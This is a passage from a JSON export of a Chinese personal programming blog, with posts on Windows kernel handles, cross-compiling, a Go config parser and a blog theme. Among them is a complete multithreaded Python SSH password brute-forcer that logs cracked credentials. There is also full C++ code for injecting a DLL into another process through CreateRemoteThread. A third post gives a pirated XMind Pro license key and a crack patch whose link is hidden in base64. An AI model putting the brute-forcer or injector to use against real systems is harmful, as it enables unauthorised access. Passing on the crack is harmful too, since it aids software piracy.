pszName);\n```\n用于创建内核对象的所有函数均返回与进程相关的句柄，这些句柄可以被在相同进程中运行的任何或所有线程成功地加以使用。该句柄值实际上是放入进程的句柄表中的索引，它用于标识内核对象的信息存放的位置。 因此当调试一个应用程序且观察内核对象句柄的实际值时，会看到一些较小的值，如1，2等。  \n\n每当调用一个将内核对象句柄接受为参数的函数时，就要传递由一个 Create*\u0026函数返回的值。从内部来说，该函数要查看进程的句柄表，以获取要生成的内核对象的地址，然后按定义得很好的方式来生成该对象的数据结构。  \n\n如果传递了一个无效索引（句柄），该函数便返回失败，而GetLastError则返回 6（ERROR_INVALID_HANDLE）。由于句柄值实际上是放入进程句柄表的索引，因此这些句柄是与进程相关的，并且不能由其他进程成功地使用。  \n\n如果调用一个函数以便创建内核对象，但是调用失败了，那么返回的句柄值通常是0（NULL）。发生这种情况是因为系统的内存非常短缺，或者遇到了安全方面的问题。不过有少数函数在运行失败时返回的句柄值是-1（INVALID_HANDLE_VALUE）。例如，如果CreateFile未能打开指定的文件，那么它将返回INVALID_HANDLE_VALUE，而不是返回NULL。当查看创建内核对象的函数返回值时，必须格外小心。特别要注意的是，只有当调用CreateFile函数时，才能将该值与INVALID_HANDLE_VALUE进行比较。下面的代码是不正确的：\n\n```cpp\nHANDLE hMutex = CreateMutex(...);\nif (hMutex == INVALID_HANDLE_VALUE) {\n    //这段代码不会执行，因为CreateMutex调用失败的时候返回的是NULL\n}\n```\n同样的，下面的代码也不正确：\n```cpp\nHANDLE hFile = CreateFile(...);\nif (hFIle == NULL) {\n    //这段代码不会执行，因为CreateFile调用失败的时候返回的是INVALID_HANDLE_VALUE(-1)\n}\n```\n\n## 关闭内核对象\n无论怎样创建内核对象，都要向系统指明将通过调用C l o s e H a n d l e来结束对该对象的操作：\n\n```cpp\nBOOL CloseHandle(HANDLE hobj);\n```\n\n如果该句柄是有效的，那么系统就可以获得内核对象的数据结构的地址，并可确定该结构中的使用计数的数据成员。如果使用计数是0，该内核便从内存中撤消该内核对象。  \n\n如果将一个无效句柄传递给CloseHandle，将会出现两种情况之一。如果进程运行正常，CloseHandle返回FALSE，而GetLastError则返回ERROR_INVALID_HANDLE。如果进程正在排除错误，系统将通知调试程序，以便能排除它的错误。 \n\n在CloseHandle返回之前，它会清除进程的句柄表中的项目，该句柄现在对你的进程已经无效，不应该试图使用它。无论内核对象是否已经撤消，都会发生清除操作。当调用CloseHandle函数之后，将不再拥有对内核对象的访问权，不过，如果该对象的使用计数没有递减为0，那么该对象尚未被撤消。这没有问题，它只是意味着一个或多个其他进程正在使用该对象。当其他进程停止使用该对象时（通过调用CloseHandle），该对象将被撤消。  \n\n假如忘记调用CloseHandle函数，那么会不会出现内存泄漏呢？答案是可能的，但是也不一定。在进程运行时，进程有可能泄漏资源（如内核对象）。但是，当进程终止运行时，操作系统能够确保该进程使用的任何资源或全部资源均被释放，这是有保证的。对于内核对象来说，系统将执行下列操作：当进程终止运行时，系统会自动扫描进程的句柄表。如果该表拥有任何无效项目（即在终止进程运行前没有关闭的对象），系统将关闭这些对象句柄。如果这些对象中的任何对象的使用计数降为0，那么内核便撤消该对象。  \n\n因此，应用程序在运行时有可能泄漏内核对象，但是当进程终止运行时，系统将能确保所有内容均被正确地清除。另外，这个情况适用于所有对象、资源和内存块，也就是说，当进程终止运行时，系统将保证进程不会留下任何对象。  \n\n## 参考文献：\n- 《Windows核心编程》\n","cover":"","link":"2018/02/04/windows进程的内核对象句柄表.html","preview":"\u003cp\u003e当一个进程被初始化时,系统要为它分配一个句柄表。该句柄表只用于内核对象 ,不用于用户对象或GDI对象。\u003c/p\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,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\" data-src=\"http://ww1.sinaimg.cn/large/c0264382gy1foaobsqowpj20nz05c0t3.jpg\" alt=\"\" /\u003e\u003c/p\u003e\n","title":"Windows进程的内核对象句柄表"},{"content":"\n\n\n\n源自一个朋友的要求，他的要求是只爆破一个ip，结果出来后就停止，如果是爆破多个，完全没必要停止，等他跑完就好\n\n\n\n```python\n#!usr/bin/env python\n#!coding=utf-8\n\n__author__='Akkuman'\n'''\nSSH爆破，由于多线程的问题，我不知道怎么做可以出现结果马上停止（会查的，有更好的方法再改）\n现在我的方法是定义了一个全局的信号finish_flag，然后每个线程检查这个信号\n线程池用的concurrent.futures.ThreadPoolExecutor，是Py3的特性，py2需要安装其他的包\n成功结果写到了result.txt，可以通过检查目录下的result.txt文件查看结果\n'''\n\nimport paramiko\nfrom concurrent.futures import ThreadPoolExecutor\nimport sys\n\nfinish_flag = False\n\ndef connect(host,user,pwd):\n    global finish_flag\n    if finish_flag:\n        sys.exit()\n    try:\n        ssh=paramiko.SSHClient()\n        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n        ssh.connect(hostname=host,username=user,password=pwd)\n        print (\"[-]Login Succ u:%s p:%s h:%s\"%(user,pwd,host))\n        with open('result.txt','a+') as f:\n            f.write(\"h:%s u:%s p:%s\\n\"%(host,user,pwd))\n        finish_flag = True\n    except paramiko.ssh_exception.SSHException as err:\n        print(\"[x]Login Fail u:%s p:%s\"%(user,pwd))\n    finally:\n        ssh.close()\n        return\n\n# 取得一个hostip,username,password\ndef getInfo():\n    # 遍历ip\n    with open('host.txt') as hosts:\n        for host in hosts:\n            hostip = host.strip()\n            print(\"[x]Target:\"+host)\n            # 遍历用户名\n            with open('user.txt') as users:\n                for user in users:\n                    username = user.strip()\n                    # 遍历密码\n                    with open('pwd.txt') as pwds:\n                        for pwd in pwds:\n                            password = pwd.strip()\n                            yield hostip,username,password\n\n\ndef main():\n    paramiko.util.log_to_file(\"filename.log\") \n    info = getInfo()\n    # 最大线程数\n    max_thread_num = 100\n    executor = ThreadPoolExecutor(max_workers=max_thread_num)\n    for host,user,pwd in info:\n        future = executor.submit(connect,host,user,pwd)\n\nif __name__ == '__main__':\n    main()\n```\n","cover":"","link":"2018/01/13/python-ssh爆破以及python3线程池控制线程数.html","preview":"\u003cp\u003e源自一个朋友的要求，他的要求是只爆破一个ip，结果出来后就停止，如果是爆破多个，完全没必要停止，等他跑完就好\u003c/p\u003e\n","title":"Python SSH爆破以及Python3线程池控制线程数"},{"content":"\n\n\n\nCodeTyphon和Lazarus的关系相当于就是ubuntu和linux的关系  \n\n不过CodeTyphon提供了很多一键配置即可使用的交叉编译配置，而Lazarus就比较麻烦了，我也没用Lazarus交叉编译过  \n\n首先假设我们交叉编译是在**windows编译出linux可执行程序**，那么我们需要做的事情大致上分为以下几步：\n\n## 下载跨平台交叉工具链(Download Cross Toolchains)\n\n框选出来的两个都可以\n\n![TIM图片20180101212151.png](https://i.loli.net/2018/01/01/5a4a3e4098508.png)\n\n\n然后选择我们所需的linux，平台cpu位数需要自己根据自己的需求来，选择好后点选最右边的下载标识等待下载（我们这里选择的**win64-i386-linux**）\n\n![TIM图片20180101212410.png](https://i.loli.net/2018/01/01/5a4a3e3f83041.png)\n\n## 下载系统二进制库(Download OSes Libraries)\n\n下载**win64-i386-linux**对应的库，你也可以选择qt4那个，只是界面库不一样而已\n\n![TIM图片20180101212939.png](https://i.loli.net/2018/01/01/5a4a3e3f9f0f9.png)\n\n\n## FPC Cross elements\n\n这一步就相当于写处理配置了，根据你选择的**win64-i386-linux**来\n\n![TIM图片20180101213357.png](https://i.loli.net/2018/01/01/5a4a3e40e8a7a.png)\n\n\n\n## Typhon的工程配置选择\n\n前几步做好后，现在只需要在ide里面做一些设置即可了，我直接放图，应该大家能看懂\n打开 `工程 \u003e 工程选项 \u003e 编译选项 \u003e 路径`把`Libraries`路径设置好\n\n![TIM图片20180101214030.png](https://i.loli.net/2018/01/01/5a4a3e41f1894.png)\n\n\n然后选择平台\n\n![TIM图片20180101214132.png](https://i.loli.net/2018/01/01/5a4a3e412bc5e.png)\n\n\nLazarus和CodeTyphon编译出来的程序体积都比较大，减小体积可以把`generate debugging info for GDB`的选项去掉\n\n![TIM图片20180101214407.png](https://i.loli.net/2018/01/01/5a4a3e41635f5.png)\n\n\n最后编译程序即可\n\n## 参考资料：  \n- [CodeTyphon - Cross-Build for Android](http://www.pilotlogic.com/sitejoom/index.php/93-wiki/ct-tutorials/222-cross-build-for-android)\n","cover":"","link":"2018/01/01/codetyphon-cross-build.html","preview":"\u003cp\u003eCodeTyphon和Lazarus的关系相当于就是ubuntu和linux的关系\u003c/p\u003e\n\n\u003cp\u003e不过CodeTyphon提供了很多一键配置即可使用的交叉编译配置，而Lazarus就比较麻烦了，我也没用Lazarus交叉编译过\u003c/p\u003e\n\n\u003cp\u003e首先假设我们交叉编译是在\u003cstrong\u003ewindows编译出linux可执行程序\u003c/strong\u003e，那么我们需要做的事情大致上分为以下几步：\u003c/p\u003e\n","title":"CodeTyphon 跨平台交叉编译的配置"},{"content":"\n\n\n\n安装包  `anchordocking`和`Sparta_DockedFormEditor`  \n\n然后点选`保存并重新编译IDE`即可\n","cover":"","link":"2018/01/01/lazarus-whole-view.html","preview":"","title":"Lazarus 分体式改成一体式窗口"},{"content":"\n\n\n\n具体效果看[我博客园](http://akkuman.cnblogs.com/)，或者看[原作者frantic1048博客](http://www.cnblogs.com/frantic1048/)\n\n\n\n## 出处\n[折腾了一个新皮肤，自带预览图](https://group.cnblogs.com/topic/71186.html)\n这个皮肤使用博主已经说的比较清楚了，我再发一遍是因为这个主题在手机上emmmm...比较惨不忍睹，自己小小的优化了一下（其实就是隐藏加margin-right哈哈），让手机端可以正常显示了，另外侧边栏有些h3标题无效果，也改进了一下，本人也没专门学过css，只是小修了一下，还是希望大家共同努力，毕竟frantic1048博主提供的这个皮肤真的挺好看\n\n## 使用方法\n主题选择`Gertrude Blue`，`禁用模板默认CSS`勾选上，然后把地址[http://www.cnblogs.com/blog/customcss/359968.css](http://www.cnblogs.com/blog/customcss/359968.css)中的css全部复制到`页面定制CSS代码`，头像自定义在css文件的239行，可以自行更换地址  \n\n`博客侧边栏公告`里面是 \n```html\n\u003cdiv id=\"sidebar-cus\"\u003e\n\u003cdiv id=\"cus-avatar\"\u003e\u003c/div\u003e\n\u003c/div\u003e\n```\n\n 如果想要使用页首，遵循下面的结构，其中第二个 span 标签是可选的:\n```\n\u003cdiv id=\"top-qoute-container\"\u003e\n    \u003cspan id=\"top-qoute-context\"\u003eIt is the path you have chosen. Take pride in it.\u003c/span\u003e\n    \u003cspan id=\"top-qoute-from\"\u003eKotomine Kirei\u003c/span\u003e\n\u003c/div\u003e\n```\n你也可以自定义一个名言列表进行轮换，不过那个需要js权限\n\n其实和frantic1048说明一样，只是css改动了一点\n\n祝大家使用愉快\n\n## 参考资料：\n- [折腾了一个新皮肤，自带预览图](https://group.cnblogs.com/topic/71186.html)\n- [frantic1048的博客](http://www.cnblogs.com/frantic1048/)\n","cover":"","link":"2017/12/28/cnblogs-theme-acg.html","preview":"\u003cp\u003e具体效果看\u003ca href=\"http://akkuman.cnblogs.com/\"\u003e我博客园\u003c/a\u003e，或者看\u003ca href=\"http://www.cnblogs.com/frantic1048/\"\u003e原作者frantic1048博客\u003c/a\u003e\u003c/p\u003e\n","title":"把博客园自己博客皮肤改了下"},{"content":"\n\n\n\n**又好了，，，，能用就行，不管了**\n\n湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用  \n\n今天却是死的不能再死，不知是不是永久，谨以此文纪念一下  \n  \n\n\n之前便是有人说马上掌大协议就失效了，但我对于这些传说，竟至于颇为怀疑。  \n\n我向来是不惮以最坏的恶意，来推测搞e信的那帮人的，然而我还不料，也不信竟会下劣凶残到这地步。况且始终可以无限时长的可使用路由器的掌大协议，更何至于无端就要失效呢？  \n\n然而今日证明是事实了，今早我起床就发现我自己的脚本登陆不上了，看了下错误输出，[58.53.196.165:8080](http://58.53.196.165:8080)打不开了，只有当你登陆e信后才能打开  \n\n可是我实在无话可说。我只觉得所住的并非人间。又回到了限时的e信，使我艰于呼吸视听，那里还能有什么言语？长歌当哭，是必须在痛定之后的。我已经出离愤怒了。我将e信这非人间的浓黑的悲凉；以我的最大哀痛显示于非人间，使它们快意于我的苦痛，就将这作为后死者的菲薄的祭品，奉献于逝者的灵前。  \n\n总之，在我的记忆上，这次可能就是永别了。\n","cover":"","link":"2017/12/24/hubei-exin-portal-was-dead.html","preview":"\u003cp\u003e\u003cstrong\u003e又好了，，，，能用就行，不管了\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用\u003c/p\u003e\n\n\u003cp\u003e今天却是死的不能再死，不知是不是永久，谨以此文纪念一下\u003c/p\u003e\n","title":"湖北掌大协议于2017-12-24入土"},{"content":"\n\n\n\n//通用许可证密钥//\n\nXMind Pro 2013~XMind Pro 8：\n\n[电子邮件地址](gnrsu@appnee.com)  \n[许可证密钥](XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345)\n\n\n//安装说明//\n\n对于XMind 8/8 Update 1/2/3/4/5/6：\n\n1. 从官方网站下载并安装XMind 8\n2. 现在不要启动它\n3. 将“Universal Patch.exe”复制到程序目录，并以管理员身份运行\n4. 启动XMind 8，输入“ 帮助/许可证... /输入许可证 ”\n5. 使用上面的许可证密钥进行注册\n6. OK\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1fmpnqbummcj20ep0a5aam.jpg)\n\n\n聪明的会知道:[Universal Patch.exe](aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xdTVLR3pkbldqMWNzbGtwNkxoYmFhV1JiUDZXQTlqTVEvdmlldz91c3A9c2hhcmluZw==)\n","cover":"","link":"2017/12/22/xmind-patch-crack.html","preview":"\u003cp\u003e//通用许可证密钥//\u003c/p\u003e\n\n\u003cp\u003eXMind Pro 2013~XMind Pro 8：\u003c/p\u003e\n","title":"XMind8 Pro版激活序列码与补丁"},{"content":"\n\n\n关于e信“正常情况下”使用路由器网上是有方法的，入户线插上lan，电脑接lan拨号\n我想要说的是连接e信后使用路由器上网，并且是绝对正常的思维\n\n手机也是可以连接上wifi，但是手机上连接wifi后的ip地址不是我们的路由器分配和路由器网关，我们改掉，使手机与电脑处于同一网关\n然后电脑开ssserver（这玩意是什么不用我多说，其实你也可以电脑搭建http proxy server（比如使用cow），然后手机连接wifi设置直接通过代理，但是对于纯tcp和udp就无能为力了）\n手机连接电脑ssserver，可以上网了，通过开debug模式可以发现走的是电脑ssserver上网\n具体的小白详细教程做法看心情和时间吧\n","cover":"","link":"2017/11/12/exin-ssserver.html","preview":"\u003cp\u003e关于e信“正常情况下”使用路由器网上是有方法的，入户线插上lan，电脑接lan拨号\n我想要说的是连接e信后使用路由器上网，并且是绝对正常的思维\u003c/p\u003e\n","title":"e信与酸酸结合开wifi使用路由器上网"},{"content":"\n\n\n突然想起来自己以前写的，golang写的一个简易的json解析器，分享一下\n\n## 安装\n\n```golang\ngo get github.com/akkuman/parseConfig\n```\n\n## 使用说明\n\n\n### 环境假设\n\n```\n.\n├── config.go\n├── config.json\n```\n\nconfig.json内容  \n\n```json\n{\n    \"name\" : \"akkuman\",\n    \"urls\" : [\"xx.com\",\"ww.com\"],\n    \"info\" : {\n        \"qq\" : \"123456\",\n        \"weixin\": \"123456\"\n    }\n}\n```\n\n该库取出来的都是类型为interface{}的数据，如需取出具体类型的数据需要自己加断言\n\n当取嵌套map数据的时候，以“ \u003e ”指定下一级，注意\u003e两边均有空格，具体见下面的例子\n\n### 例子\n\nconfig.go内容\n\n```goalng\npackage main\n\nimport (\n    \"github.com/akkuman/parseConfig\"\n)\n\nfunc main() {\n    var config = parseConfig.New(\"config.json\")\n    // 此为interface{}格式数据\n    var name = config.Get(\"name\")\n    // 断言\n    var nameString = name.(string)\n    \n    // 取数组\n    var urls = config.Get(\"urls\").([]interface{})\n    var urlsString []string\n    for _,v := range urls {\n        urlsString = append(urlsString, v.(string))\n    }\n    \n    // 取嵌套map内数据\n    var qq = config.Get(\"info \u003e qq\").(\"string\")\n    var weixin = config.Get(\"info \u003e weixin\").(\"string\")\n}\n```\n","cover":"","link":"2017/10/25/golang解析json配置文件.html","preview":"\u003cp\u003e突然想起来自己以前写的，golang写的一个简易的json解析器，分享一下\u003c/p\u003e\n\n\u003ch2\u003e安装\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-golang\"\u003ego get github.com/akkuman/parseConfig\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2\u003e使用说明\u003c/h2\u003e\n","title":"golang解析json配置文件"},{"content":"\n\n\n\ntalk is cheap,show me code\n代码有详细注释，文章底部提示了一些坑\n\n\n## 主程序\n\n```cpp\n#include \"stdafx.h\"\n#include \u003cwindows.h\u003e\n#include \u003ciostream\u003e\n#include \u003ctlhelp32.h\u003e\n#include \u003ctchar.h\u003e\n\n\nusing namespace std;\n\nint EnableDebugPriv(char* name)\n{\n\tHANDLE hToken;\n\tTOKEN_PRIVILEGES tp;\n\tLUID luid;\n\t//打开进程令牌环\n\tOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \u0026hToken);\n\t//获得进程本地唯一ID\n\tLookupPrivilegeValue(NULL, name, \u0026luid);\n\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\ttp.Privileges[0].Luid = luid;\n\t//调整权限\n\tAdjustTokenPrivileges(hToken, 0, \u0026tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);\n\treturn 0;\n}\n\n//*****************************************************************************************************************************\n\nBOOL InjectDll(LPCSTR DllFullPath, const DWORD dwRemoteProcessId)\n{\n\t// 提升权限(必须管理员身份)\n\tEnableDebugPriv(SE_DEBUG_NAME);\n\n\t//打开远程线程\n\tHANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);\n\tif (hRemoteProcess == NULL)\n\t{\n\t\tcout \u003c\u003c \"Error: OpenProcess failed!\\n\" \u003c\u003c endl;\n\t\treturn FALSE;\n\t}\n\n\t//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间\n\tLPVOID pszLibFileRemote = VirtualAllocEx(hRemoteProcess, NULL, lstrlen(DllFullPath) + 1, MEM_COMMIT, PAGE_READWRITE);\n\tif (pszLibFileRemote == NULL)\n\t{\n\t\tCloseHandle(hRemoteProcess);\n\t\tcout \u003c\u003c \"Error: VirtualAllocEx failed!\\n\" \u003c\u003c endl;\n\t\treturn FALSE;\n\t}\n\n\t//使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间\n\tif (!WriteProcessMemory(hRemoteProcess, pszLibFileRemote, DllFullPath, lstrlen(DllFullPath) + 1, NULL))\n\t{\n\t\tCloseHandle(hRemoteProcess);\n\t\tcout \u003c\u003c \"Error: WriteProcessMemory failed!\\n\" \u003c\u003c endl;\n\t\treturn FALSE;\n\t}\n\n\t//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程\n\tHANDLE hRemoteThread;\n\tif ((hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)) == NULL)\n\t{\n\t\tCloseHandle(hRemoteProcess);\n\t\tcout \u003c\u003c \"Error: the remote thread could not be created.\\n\" \u003c\u003c endl;\n\t\treturn FALSE;\n\t}\n\telse\n\t{\n\t\t// 等待线程退出 要设置超时 以免远程线程挂起导致程序无响应\n\t\t//WaitForSingleObject(hRemoteThread, 10000);\n\t\t// 如果等待线程 DLL中的DllMain不要写MessageBox\n\t\tcout \u003c\u003c \"Success: the remote thread was successfully created.\\n\" \u003c\u003c endl;\n\t}\n\n\t// 释放句柄\n\tCloseHandle(hRemoteProcess);\n\tCloseHandle(hRemoteThread);\n\n\treturn TRUE;\n}\n\n// 根据进程名称获取进程ID\nDWORD FindTarget(LPCSTR lpszProcess)\n{\n\tDWORD dwRet = 0;\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tPROCESSENTRY32 pe32;\n\tpe32.dwSize = sizeof(PROCESSENTRY32 );\n\tProcess32First(hSnapshot, \u0026pe32 );\n\tdo\n\t{\n\t\tif (lstrcmpi(pe32.szExeFile, lpszProcess) == 0)\n\t\t{\n\t\t\tdwRet = pe32.th32ProcessID;\n\t\t\tbreak;\n\t\t} \n\t} while (Process32Next(hSnapshot, \u0026pe32));\n\tCloseHandle(hSnapshot);\n\treturn dwRet; \n}\n\n\n//*****************************************************************************************************************************\n\nint main()\n{\n\n\tDWORD id = FindTarget((LPCSTR)\"calc.exe\");\n\tcout \u003c\u003c id \u003c\u003c endl;\n\n\t// 获取可执行文件所在目录\n\tTCHAR szFilePath[MAX_PATH + 1];\n\tGetModuleFileName(NULL, szFilePath, MAX_PATH);\n\t*(_tcsrchr(szFilePath, '\\\\')) = 0;\n\n\t_tcscat_s(szFilePath, sizeof(szFilePath), \"\\\\dll.dll\");\n\tcout \u003c\u003c szFilePath \u003c\u003c endl;\n\tInjectDll(szFilePath, id);//这个数字是你想注入的进程的ID号\n\treturn 0;\n}\n```\n\n## dllmain\n```cpp\n// dllmain.cpp : 定义 DLL 应用程序的入口点。\n#include \"stdafx.h\"\n\n#include \u003ciostream\u003e\n\nusing namespace std;\n\nBOOL APIENTRY DllMain(HINSTANCE hInst     /* Library instance handle. */,\n\tDWORD reason        /* Reason this function is being called. */,\n\tLPVOID reserved     /* Not used. */)\n{\n\tswitch (reason)\n\t{\n\tcase DLL_PROCESS_ATTACH: //当这个DLL被映射到了进程的地址空间时\n\t\tMessageBox(0, TEXT(\"From DLL\\n\"), TEXT(\"Process Attach\"), MB_ICONINFORMATION);\n\t\tcout \u003c\u003c \"Process Attach\" \u003c\u003c endl;\n\t\tbreak;\n\n\tcase DLL_PROCESS_DETACH: //这个DLL从进程的地址空间中解除映射\n\t\tMessageBox(0, TEXT(\"From DLL\\n\"), TEXT(\"Process Detach\"), MB_ICONINFORMATION);\n\t\tcout \u003c\u003c \"Process Detach\" \u003c\u003c endl;\n\t\tbreak;\n\n\tcase DLL_THREAD_ATTACH: //一个线程正在被创建\n\t\tMessageBox(0, TEXT(\"From DLL\\n\"), TEXT(\"Thread Attach\"), MB_ICONINFORMATION);\n\t\tcout \u003c\u003c \"Thread Attach\" \u003c\u003c endl;\n\t\tbreak;\n\n\tcase DLL_THREAD_DETACH: //线程终结\n\t\tMessageBox(0, TEXT(\"From DLL\\n\"), TEXT(\"Thread Detach\"), MB_ICONINFORMATION);\n\t\tcout \u003c\u003c \"Thread Detach\" \u003c\u003c endl;\n\t\tbreak;\n\t}\n\n\treturn TRUE;\n}\n```\n\n## 需要注意的地方\n\n1. 环境是vs，字符集是多字节\n2. 这份代码中的`hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)`中的也可采用GetProcAddress函数  \n3. 